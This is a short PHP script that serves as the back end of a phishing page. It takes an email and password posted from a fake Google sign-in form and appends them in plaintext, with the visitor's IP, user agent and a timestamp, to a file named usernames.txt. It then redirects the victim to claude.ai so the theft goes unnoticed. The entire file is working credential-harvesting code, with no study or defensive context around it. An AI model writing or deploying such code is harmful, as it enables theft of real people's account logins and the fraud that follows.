<?php
session_start();

$email = trim(str_replace(["\r", "\n"], '', $_POST['email'] ?? 'Unknown'));
$pass = trim(str_replace(["\r", "\n"], '', $_POST['password'] ?? 'Unknown'));
$ip = $_SERVER['HTTP_CLIENT_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'unknown';
$ua = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
$time = date('Y-m-d H:i:s');

$data = "Username: " . $email . "\nPass: " . $pass . "\n[TYPE] GOOGLE_OAUTH\n[TIME] " . $time . "\n[IP] " . $ip . "\n[UA] " . $ua . "\n---\n";

file_put_contents('usernames.txt', $data, FILE_APPEND | LOCK_EX);

// Redirect to Claude
header('Location: https://claude.ai/');
exit();
?>
